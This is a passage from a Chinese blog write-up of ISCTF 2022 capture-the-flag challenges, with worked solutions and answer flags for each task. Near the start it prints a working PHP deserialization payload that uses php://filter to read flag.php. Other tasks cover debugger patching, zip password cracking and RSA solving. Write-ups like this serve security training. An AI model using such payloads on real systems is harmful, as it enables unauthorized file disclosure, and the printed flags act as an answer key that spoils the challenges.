+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class mouse</span><br><span class="line">&#123;</span><br><span class="line">    public $v=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Good. You caught the mouse:&quot;;</span><br><span class="line">        include($this-&gt;v);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class cat</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public $c;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;dog();</span><br><span class="line">        $this-&gt;b = $this-&gt;c;</span><br><span class="line">        die($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    public function dog()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = &quot;&lt;br&gt;I&#x27;m a vicious dog, Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new cat();</span><br><span class="line">$a-&gt;a=&amp;$a-&gt;b;</span><br><span class="line">$a-&gt;c=new mouse();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>
+<img src="/C4skg/3a7ba136/9.jpg" class="">
+<p>palody ?cat=O:3:“cat”:3:{s:1:“a”;N;s:1:“b”;R:2;s:1:“c”;O:5:“mouse”:1:{s:1:“v”;s:57:“php://filter/read=convert.base64-encode/resource=flag.php”;}}</p>
+<p>得到 PD9waHAKJGZsYWc9IklTQ1RGe2IxMTI0MGE5LTMwOTQtNGI3Mi1iZjlhLTcwMjY2MGViZGVlZH0iOwo/Pgo=</p>
+<p>base64解密后得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ISCTF&#123;b11240a9-3094-4b72-bf9a-702660ebdeed&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="Misc">Misc</h3>
+<h4 id="磁盘管理大师">磁盘管理大师</h4>
+<p>下下来发现是个磁盘文件，碰到这种直接foremost 分离即可 <code>foremost.exe -T flag.vhd</code></p>
+<p>出来个图片，是png，然后LSB一下即可</p>
+<img src="/C4skg/3a7ba136/image-20221101201035557.png" class="">
+<p>flag: <code>ISCTF&#123;LSB_LSB_LSB&#125;</code></p>
+<h4 id="手残党福利">手残党福利</h4>
+<p>打开是iwanan，先玩两把，过了第一关，过不去了，但是发现本地下生成了三个缓存文件</p>
+<img src="/C4skg/3a7ba136/image-20221101201650535.png" class="">
+<p>多次测试后，发现修改save1文件中的数据，能做到跳跃关卡</p>
+<img src="/C4skg/3a7ba136/image-20221101230228391.png" class="">
+<p>修改标红的两个即可，推测第一个字节为当前关卡，第二个字节为上一关卡，两者直接始终差距为2即可。修改完成后保存，再次打开游戏即跳关成功。最后测试，发现最后一关为47 45<img src="/C4skg/3a7ba136/image-20221101230537021.png" class=""></p>
+<p>拿到flag</p>
+<img src="/C4skg/3a7ba136/image-20221101230558572.png" class="">
+<p><code>ISCTF&#123;IWANNA_IS_EASY&#125;</code></p>
+<h4 id="give-your-color-cc">give_your_color_cc</h4>
+<p>刚开始没做出来，给了提示，说注意Linux字体终端颜色，拿了两个下来保存为txt，对比后发现，图像在变化，但是前面的颜色，是不会变的。也就是<code>[0m</code>之前的内容</p>
+<img src="/C4skg/3a7ba136/image-20221101231119847.png" class="">
+<p>那就很简单了，直接写脚本读取，然后获取每个值的个位数字，并算出其二进制，联合在一起后，转ascii码。</p>
+<p>但是直接二进制连起来并八位分割，出不来，因此继续观察， 发现每个值的二进制都不超过3位数，因此不足三位的用0补全，然后再8位分割，出来的字符串通过base64解码即可。但是后面研究发现将其6位分割，然后对照base64加密表，输出的值经过两次base64解码也可得到flag</p>
+<img src="/C4skg/3a7ba136/image-20221101231333432.png" class="">
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode;</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">d=f.read()</span><br><span class="line">d=d.split(<span class="string">b&#x27;\x1b&#x27;</span>)[<span class="number">2</span>:]</span><br><span class="line">q=[]</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">65</span>+<span class="number">26</span>)]+[<span class="built_in">chr</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">97</span>+<span class="number">26</span>)]+[<span class="built_in">str</span>(z) <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>)] + [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;/&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> j&lt;<span class="built_in">len</span>(d):</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">b&#x27;[0m&#x27;</span> <span class="keyword">in</span> d[j]):</span><br><span class="line">        q.append(d[j-<span class="number">1</span>][<span class="number">1</span>:<span class="number">3</span>])</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> q:</span><br><span class="line">    t = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(i,<span class="string">&#x27;utf-8&#x27;</span>)[-<span class="number">1</span>])))[<span class="number">2</span>:];</span><br><span class="line">    t = t <span class="keyword">if</span> <span class="built_in">len</span>(t) == <span class="number">3</span> <span class="keyword">else</span> <span class="string">&quot;0&quot;</span>*(<span class="number">3</span>-<span class="built_in">len</span>(t))+t;</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    ans += t;  <span class="comment">#必须是3位</span></span><br><span class="line">    </span><br><span class="line">flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(ans),<span class="number">8</span>):</span><br><span class="line">    inner = <span class="built_in">int</span>(ans[i:i+<span class="number">8</span>],<span class="number">2</span>);</span><br><span class="line">    flag += <span class="built_in">chr</span>(inner);</span><br><span class="line"><span class="built_in">print</span>(b64decode(flag).decode())</span><br><span class="line"><span class="comment"># print(b64decode(b64decode(flag)).decode());</span></span><br></pre></td></tr></table></figure>
+<p><code>ISCTF&#123;7f2686c8-f2ac-4edc-a39a-8ee15b108723&#125;</code></p>
+<h4 id="Welcome-To-ISCTF2022">Welcome To ISCTF2022</h4>
+<p>关注公众号 回复：ISCTF2022 得到flag</p>
+<p><code>ISCTF&#123;We1c0me_T0_ISCTF&amp;BlueShark&#125;</code></p>
+<h4 id="KFC疯狂星期四">KFC疯狂星期四</h4>
+<p>用WINRAR的修复功能修复压缩包</p>
+<p>打开12.png，发现图片高度不对，修改图片高度 : <code>uint32 height 951</code></p>
+<p>得到121.zip的密码 ：YouVme-50</p>
+<p>用010Editor打开121.jpg，在文件尾发现flag：<code>ISCTF&#123;kFc_tHuRsday-v_mE_50&#125;</code></p>
+<h4 id="简单社工">简单社工</h4>
+<p>观察图片信息 判定在台湾省高雄市</p>
+<p>谷歌识图 在推特中发现高清原图</p>
+<img src="/C4skg/3a7ba136/%E6%8E%A8%E7%89%B9%E5%8E%9F%E5%9B%BE.png" class="">
+<p>判断此地铁线为 红线 在高雄捷运官网找到列车末班车时间表 与图中站点末班车时间表对应</p>
+<img src="/C4skg/3a7ba136/%E7%AB%99%E7%82%B9%E6%97%B6%E9%97%B4%E8%A1%A8.png" class="">
+<p>确定为台湾省高雄市左营区巨蛋站 套上MD5与ISCTF{}，得到flag</p>
+<p><code>ISCTF&#123;644bb9fd9d3656a78e28e76102427224&#125;</code></p>
+<h4 id="可爱的emoji">可爱的emoji</h4>
+<p>根据提示 使用字典工具superdic生成KEY+五位大写字母的字典，用ARCHPR进行爆破得到密码KEYISAES</p>
+<p>结合emoji的txt文件，推测为emoji-aes 用在线网站 <a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a> 解密，密钥为AES</p>
+<p>尝试 Rotation=9时得到flag : <code> ISCTF&#123;love1y_enn0ji&#125;</code></p>
+<h4 id="老色批了奥">老色批了奥</h4>
+<p>010打开setu.png，发现文件尾有压缩包，手动分离，得到一个假的flag：</p>
+<p><code>fakeflag&#123;DongMaXX_XueLaiXX&#125;</code></p>
+<p>用Stegsolve打开</p>
+<img src="/C4skg/3a7ba136/Stegsolve.png" class="">
+<p>发现左侧是半字节逆序的zip文件头，直接上python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hex.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines();</span><br><span class="line">res = [];</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    line = line.strip(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(line)):</span><br><span class="line">        line[bit] = line[bit][::-<span class="number">1</span>];</span><br><span class="line">    res.append(<span class="string">&quot;&quot;</span>.join(line));</span><br><span class="line">d = <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>);</span><br><span class="line">d.write(<span class="string">&quot; &quot;</span>.join(res));</span><br></pre></td></tr></table></figure>
+<p>保存修改后的文件，格式为zip，用WINRAR的修复功能修复压缩包，打开得到flag</p>
+<p><code>ISCTF&#123;A76510E3-FEA7-68F8-2C31-0A4ECAE5197A&#125;</code></p>
+<h4 id="捕风的魔女">捕风的魔女</h4>
+<p>flag1.png为魔女之旅文字</p>
+<img src="/C4skg/3a7ba136/%E9%AD%94%E5%A5%B3%E4%B9%8B%E6%97%85%E5%AD%97%E5%85%B8.png" class="">
+<p>flag2.png为原神文字</p>
+<img src="/C4skg/3a7ba136/%E5%8E%9F%E7%A5%9E%E5%AD%97%E5%85%B8.png" class="">
+<p>组合即得flag：	<code>ISCTF&#123;VLIXCBXZDZLSFXRXIUBWWZXDFFOXMGJL&#125;</code></p>
+<h4 id="小蓝鲨的秘密">小蓝鲨的秘密</h4>
+<p>WINRAR修复压缩包得到hint</p>
+<p>ARCHPR爆破得到密码</p>
+<img src="/C4skg/3a7ba136/ARCHPR.png" class="">
+<p>根据文件名OurSecret,用OurSecret解密，根据hint密码相同，得到flag.txt</p>
+<p>flag：<code>ISCTF&#123;bluesharkinfo_1s||24rarht83_xyy&#125;</code></p>
+<h3 id="Reverse">Reverse</h3>
+<h4 id="SigninReverse">SigninReverse</h4>
+<p>打开靶机，下载<code>task.exe</code>文件后，用ida打开，找到main函数进去后反汇编，就是flag</p>
+<img src="/C4skg/3a7ba136/image-20221102075330088.png" class="">
+<p>flag:<code>ISCTF&#123;c78e2009-e3c5-4ccd-bed0-0860fd953a7d&#125;</code></p>
+<h4 id="ezbase">ezbase</h4>
+<p>下载下来是个exe文件，用ida打开，找到main函数后返汇编，简单分析后，发现，只要使得Str1==Str2即可</p>
+<img src="/C4skg/3a7ba136/image-20221102075705830.png" class="">
+<p>直接拖进gbd打开，一直点运行，直到跳到需要用户输入，然后找到 you win！的位置，打上断点</p>
+<img src="/C4skg/3a7ba136/image-20221102080116442.png" class="">
+<p>随便输入东西进去，在断电位置停住了，按F7步进，发现有base64</p>
+<img src="/C4skg/3a7ba136/image-20221102080212445.png" class="">
+<p>复制下来解码<img src="/C4skg/3a7ba136/image-20221102080249262.png" class=""></p>
+<p>得到flag</p>
+<p><code>flag&#123;34pxo9UsVkDWRNu5XTCXWuLq3BQEm1kwzo&#125;</code></p>
+<h4 id="坤坤的csgo邀请">坤坤的csgo邀请</h4>
+<p>打开是个exe文件，用gbd打开，并运行，在用户输入处停住。</p>
+<img src="/C4skg/3a7ba136/image-20221102181200248.png" class="">
+<img src="/C4skg/3a7ba136/image-20221102181240459.png" class="">
+<p>找了exe中的字符串，发现一个很像flag的值，但是不完整，在上面找个地方打个断点，运行一下尝试能不能拿到flag</p>
+<img src="/C4skg/3a7ba136/image-20221102182131647.png" class="">
+<p>随意输入值后，在此处停住，je 是判断输入的值是否正确，停住后，将右侧的ZE标志位改为0，让其条件满足即可</p>
+<img src="/C4skg/3a7ba136/image-20221102182251946.png" class="">
+<p>然后快进到弹窗，得到flag</p>
+<img src="/C4skg/3a7ba136/image-20221102182353908.png" class="">
+<p>flag:<code>ISCTF&#123;Kun._Ku..n_loves_you_.s0_m.uc.h.&#125;</code></p>
+<h4 id="base64">base64</h4>
+<p>将 exe文件用IDA打开，找到main函数并进入，按F5反汇编，得到基本函数结构和内容</p>
+<img src="/C4skg/3a7ba136/image-20221102182854671.png" class="">
+<p>先将base64的字符串解码，发现并不是flag</p>
+<p>梳理了一下，将目标定在了这个函数中</p>
+<img src="/C4skg/3a7ba136/image-20221102183021431.png" class="">
+<p>双击进入，简单分析代码，猜测main函数中的base64值是通过这个函数运算得到的，因为这个函数中的对应的变量 <code>aAbcdefghijklmn</code>的值通过双击后，发现为基本的base64对照表</p>
+<img src="/C4skg/3a7ba136/image-20221102183426863.png" class="">
+<img src="/C4skg/3a7ba136/image-20221102183401212.png" class="">
+<p>正常的base64对照加密表的值是 <code>A-Za-z0-9+/</code>，但是很明显，这里的0被换成了O,所以将这串base64值通过错误的密码表来解密即可</p>
+<img src="/C4skg/3a7ba136/image-20221102184300443.png" class="">
+<p>解密得到的值用 <code>ISCTF&#123;&#125;</code>包裹即可</p>
+<p>flag: <code>ISCTF&#123;159e34224c00ead2d3a039d32084ee50&#125;</code></p>
+<h4 id="开摆re">开摆re</h4>
+<p>将exe文件用IDA打开，找到main函数并用F5反汇编</p>
+<img src="/C4skg/3a7ba136/QQ%E6%88%AA%E5%9B%BE20221029160354.png" class="">
+<p>分析结果如上图,直接写解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">primary = <span class="string">&#x27;isctfajzu&#x27;</span>;</span><br><span class="line">str2 = <span class="string">&#x27;123456789&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(str2[i])^<span class="built_in">ord</span>(primary[i])),end=<span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>运行脚本得到<code>XAP@SW]BL</code></p>
+<p>作为激活码输入进行验证，成功</p>
+<img src="/C4skg/3a7ba136/image-20221102184558197.png" class="">
+<p>cjmdflag: <code>ISCTF&#123;XAP@SW]BL&#125;</code></p>
+<h3 id="Crypto">Crypto</h3>
+<h4 id="这是什么古典玩意">这是什么古典玩意</h4>
+<p>flag由三部分组成,part1为Base64 	得到 BlueShark</p>
+<p>part2为16进制转字符得到\u53\u65\u65\u6D\u73\u53\u30,去掉\u再次转字符	得到 SeemsS0</p>
+<p>part3为猪圈密码 对照密码表可得 cute</p>
+<p>组成完整flag:	<code>ISCTF&#123;BlueShark_SeemsS0_cute&#125;</code></p>
+<h4 id="ezcry">ezcry</h4>
+<p>用 yafu 分解出 s , k</p>
+<p><code>s = 176868710737612660790124725586933365207</code></p>
+<p><code>k = 249652499719930280463165749259207398633</code></p>
+<img src="/C4skg/3a7ba136/yafu.png" class="">
+<p>解出s , k后即可推出 p , q的值</p>
+<p><code>p=124431097685731585500751867561577386168625841833110547803689338621205694806894593800890539870901241604771309656881714338980632734600555998963734012020140199718421450936912672638698198874438316460684901133302344433574864927296261487308172012685704080591703927800706930307570111656989099386334418808318738228707</code></p>
+<p><code>q=136899269368574494181432774464678202037635589190950946226297544277459575545677315054120424232811345008456618479471930375486284959459949992475679011596136875096300441920570897559993673334614086077512235940271412778240309588973215899038656984058786224113488739164322245715370193417530133818250200774863603490877</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = <span class="number">124431097685731585500751867561577386168625841833110547803689338621205694806894593800890539870901241604771309656881714338980632734600555998963734012020140199718421450936912672638698198874438316460684901133302344433574864927296261487308172012685704080591703927800706930307570111656989099386334418808318738228707</span></span><br><span class="line">q = <span class="number">136899269368574494181432774464678202037635589190950946226297544277459575545677315054120424232811345008456618479471930375486284959459949992475679011596136875096300441920570897559993673334614086077512235940271412778240309588973215899038656984058786224113488739164322245715370193417530133818250200774863603490877</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">6636871845889289821451339461667353441602430792099749101933216934629214305159040913567522609116395485018234259025910227221402350884391969711051377864656945164699379734982178962637190192088596776288873871651609167259167456816094141938735498585327839045360319836147041837569528592447701501104067430848582239927052031661696213986982946173792468753773505681630323945625892041031455025095934790620541499679023777086690062211807019645557781380979957862910047981754126193036968611612056475750787560328372643151874535031184052794483578557248028165948247504989100884012688908781349748818365779371062209169311607720595792421590</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gp.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>
+<p>得到flag : <code>ISCTF&#123;iiii|||yesyes||7777&#125;</code></p>
+<h4 id="ezRSA">ezRSA</h4>
+<p>题目考察点是e和phi_n不互素</p>
+<p>用python脚本解题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">p= <span class="number">146061540583135242741006647792481468215928177245453689591382075771990192360040412020479342624228118794110240955451899373848827328177557126556072570082923983968091404980923313006963667391261364191537502509633623502033578910844508808321175673461956149400289968262858691371016246515264343715246136003074155184273</span></span><br><span class="line">q= <span class="number">106988826778655284666865642844938578070029566283623778317110345394696520999319699165122638213405544697509248818119744714371964212582672270467711234178627339558783803718844973937701655329775612593193896887658613019039808270266901149871250769922857432588126510259997039777751047281603319139760808677732919216899</span></span><br><span class="line">e= <span class="number">740</span></span><br><span class="line">c= <span class="number">6282526058961246581872664236584053247822096703448673698014149841099601111078858783085447440545491467659016466697346055841162217815656467685468263870813754625318960798390457353869689600971254126026498299128586642169553158659216998193596000256435504143502966206895545701691216757482393700125791878031903647831939512035110314068235625347074791191183719857770670134500097347113475463330210378392860796906074883251200522628116993249459465350593837432195675595929482809838619649519612607292091411530134831844063986714485104831320923176335931609571205307034732956741442770883207107022828296237748601658720079333177460160664</span></span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure>
+<p>得到flag: <code>ISCTF&#123;1dedc976-d253-4053-b2f5-557282f41fc5&#125;</code></p>
+<h4 id="蓝鲨密码">蓝鲨密码</h4>
+<p>打开文件发现密码为 蓝鲨. 蓝鲨! 蓝鲨？组成	判断为short Ook,用Notepad++打开，查找替换功能使文本只剩下.!?	在线网站解密https://tool.bugku.com/brainfuck/</p>
+<p>用 cyberchef 一梭子</p>
+<img src="/C4skg/3a7ba136/cyberchef.png" class="">
+<p>观察字符串只有 BLUE，SHARK	尝试莫斯解密	 <a target="_blank" rel="noopener" href="http://www.all-tool.cn/Tools/morse/">http://www.all-tool.cn/Tools/morse/</a></p>
+<p>得到	CUTE_B1UESHARKINF0	转小写得到flag：<code>ISCTF&#123;cute_b1uesharkinf0&#125;</code></p>
+<h4 id="咦-这个密码-怎么怪怪的">咦 这个密码 怎么怪怪的</h4>
+<p>观察为五个base码，拼成一行后 尝试栅栏，栏数为5</p>
+<p>得到	<code>JFJUGVCGPNAF6M3BON4V6QSBKNCTGMRBPU======</code></p>
+<p>base32解密 得到flag：<code>ISCTF&#123;@_3asy_BASE32!&#125;</code></p>
+<h4 id="呜呜呜我的md5脏了">呜呜呜我的md5脏了</h4>
+<p>栅栏数为5时，为正常flag：<code>ISCTF&#123;md5_is_11??1??8???&#125;</code></p>
+<p>已知md5值为 88875458bdd87af5dd2e3c750e534741</p>
+<p>用python脚本爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;88875458bdd87af5dd2e3c750e534741&quot;</span>;</span><br><span class="line">flag = <span class="string">&quot;ISCTF&#123;md5_is_11%s%s1%s%s8%s%s%s&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">list1=[<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>)];</span><br><span class="line"><span class="built_in">print</span>(list1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(list1,repeat=<span class="number">7</span>):</span><br><span class="line">    i = [ <span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> i];</span><br><span class="line">    res = flag % (i[<span class="number">0</span>],i[<span class="number">1</span>],i[<span class="number">2</span>],i[<span class="number">3</span>],i[<span class="number">4</span>],i[<span class="number">5</span>],i[<span class="number">6</span>]);</span><br><span class="line">        <span class="comment"># print(md5(res.encode()).hexdigest());</span></span><br><span class="line">    <span class="keyword">if</span> (md5(res.encode()).hexdigest() == ans):</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>得到flag：<code>ISCTF&#123;md5_is_11451438324&#125;</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://c4skg.top">C4skg</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://c4skg.top/C4skg/3a7ba136.html">https://c4skg.top/C4skg/3a7ba136.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://c4skg.top" target="_blank">C4skg's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ISCTF/">ISCTF</a><a class="post-meta__tags" href="/tags/WP/">WP</a></div><div class="post_share"><div class="social-share" data-image="https://static.c4skg.top/c4skg/banner.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/C4skg/201698b1.html" title="博主GitHub开源项目推荐"><img class="cover" src="https://static.c4skg.top/c4skg/banner.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">博主GitHub开源项目推荐</div></div></a></div><div class="next-post pull-right"><a href="/C4skg/2d4d6e2f.html" title="NBCTF-ezinclude"><img class="cover" src="https://static.c4skg.top/c4skg/banner.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">NBCTF-ezinclude</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/C4skg/34bb0543.html" title="2023LitCTF-WP"><img class="cover" src="https://static.c4skg.top/c4skg/banner.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-15</div><div class="title">2023LitCTF-WP</div></div></a></div><div><a href="/C4skg/4fd9b10f.html" title="2023年第三届陕西省大学生网络安全技能大赛"><img class="cover" src="https://static.c4skg.top/c4skg/banner.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-03</div><div class="title">2023年第三届陕西省大学生网络安全技能大赛</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://static.c4skg.top/c4skg/logo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" 